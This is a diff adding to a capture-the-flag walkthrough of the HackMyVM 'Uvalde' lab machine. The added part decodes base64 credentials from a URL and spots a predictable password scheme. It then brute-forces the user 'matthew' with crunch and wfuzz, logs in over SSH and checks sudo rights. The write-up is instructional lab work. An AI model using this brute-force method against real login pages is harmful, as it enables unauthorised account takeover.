@@ -161,7 +161,7 @@ cool we got hidden dirs, let's create an account.
 
 ![image](https://user-images.githubusercontent.com/87468669/221405294-2eb6e353-d3b9-4956-9053-ebb52539aee3.png)
 
-
+![image](https://user-images.githubusercontent.com/87468669/221416995-30e66e60-f0b5-49eb-b930-046fccba57e5.png)
 
 after creating an account, got a base64 encoded text in the url link. copied it 
 
@@ -170,7 +170,101 @@ after creating an account, got a base64 encoded text in the url link. copied it
 └─$ echo "dXNlcm5hbWU9bmlnaHRoYXdrJnBhc3N3b3JkPW5pZ2h0aGF3azIwMjNANjA4MQ==" | base64 -d 
 username=nighthawk&password=nighthawk2023@6081 
 ```
-decoded the text and we got to see creates the accout success but it automatically gives us a password. let's login 
+decoded the text and we got to see creates the accout success but it automatically gives us a password. 🤔 let's login
+
+![image](https://user-images.githubusercontent.com/87468669/221417115-e9ae52d0-9493-4668-b0b9-be059b056a8f.png)
+
+logged , got a page under construction. 🤔... let's try create another account and see it will assign the same password for us.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
+└─$ echo "dXNlcm5hbWU9aGFja2VyJnBhc3N3b3JkPWhhY2tlcjIwMjNAMTEzMA==" | base64 -d
+username=hacker&password=hacker2023@1130
+```
+cool we can see it takes the username supplid , 2023, @, random 4 digit number `(usrname2023@random 4 digit)` and assign it as our password. let's try fuzz the random number to get the password for user `matthew`, since it might be `matthew2023@XXXX`. 
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
+└─$ crunch 4 4 1234567890 -o numb.txt                                                                         
+Crunch will now generate the following amount of data: 50000 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 10000 
+
+crunch: 100% completed generating output
+```
+first generate random 4 digit number using crunch. now let run ffuf to fuzz the number.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
+└─$ wfuzz -X POST -d "username=matthew&password=matthew2023@FUZZ" -w numb.txt -u http://192.168.0.102/login.php  --hl 60
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.0.102/login.php
+Total requests: 10000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                              
+=====================================================================
+
+000000444:   302        0 L      0 W        0 Ch        "1554"                                                                                               
+
+Total time: 21.52361
+Processed Requests: 10000
+Filtered Requests: 9999
+Requests/sec.: 464.6060
+```
+using wfuzz instead to fuzz cause ffuf did not bring the expected result. we got the password for user `matthew:matthew2023@1554` now let's login. 
+
+![image](https://user-images.githubusercontent.com/87468669/221418553-f57c5618-a12a-4c73-8ef0-741ca41a5014.png)
+
+logged in as user `matthew`, got the same page under construction. let's try login ssh using the password.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Hackmyvm/Uvalde]
+└─$ ssh matthew@192.168.0.102
+The authenticity of host '192.168.0.102 (192.168.0.102)' can't be established.
+ED25519 key fingerprint is SHA256:S2tp/jV32/GtUP68f14Rac4/yZXhbMmyut+ZqO+ZOl4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.0.102' (ED25519) to the list of known hosts.
+matthew@192.168.0.102's password: 
+Permission denied, please try again.
+matthew@192.168.0.102's password: 
+Linux uvalde.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+matthew@uvalde:~$ id
+uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
+matthew@uvalde:~$ whoami 
+matthew
+matthew@uvalde:~$ 
+```
+boom!!! we are in a user `matthew` 
+
+
+## Privilege Escalation
+
+```
+matthew@uvalde:~$ sudo -l
+Matching Defaults entries for matthew on uvalde:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User matthew may run the following commands on uvalde:
+    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
+matthew@uvalde:~$ 
+```
+by checking sudo permission, we can see we can run `/bin/bash /opt/superhack` as sudo without password. let's check the content of this file
 
 
 
